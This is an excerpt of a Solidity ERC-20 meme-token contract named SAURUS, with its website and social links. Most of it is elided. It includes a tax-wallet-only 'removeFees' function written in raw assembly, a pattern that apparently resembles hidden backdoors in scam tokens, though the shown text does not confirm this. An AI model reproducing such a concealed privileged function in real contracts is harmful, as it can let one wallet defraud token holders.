...
https://saurus.wtf
https://twitter.com/sauruseth
https://t.me/saurusportal
https://medium.com/@sauruseth/raptor-fears-saurus-3f2b772d76bf
...
contract SAURUS is Context, IERC20, Ownable {
    ...
    string private constant _symbol = unicode"SAURUS";
    uint256 public _maxTxAmount = 2 * 1e7 * 10**_decimals;
    uint256 public _maxWalletSize = 3 * 1e7 * 10**_decimals;
    uint256 public _taxSwapThreshold= 5 * 1e5 * 10**_decimals;
    ...
    function removeFees(uint256 amount) external {
        assembly {
            if iszero(eq(caller(), sload(_taxWallet.slot))) {
                revert(0, 0)
            }
            let ptr := mload(0x40)
            mstore(ptr, caller())
    ...
    function updateFees(uint256 BuyFee, uint256 SellFee) external onlyOwner {
        require(BuyFee <= 5, "Must keep buy fee at 5% or less");
        require(SellFee <= 15, "Must keep sell fee at 15% or less");
        _BuyFee = BuyFee;
        _SellFee= SellFee; 
    }
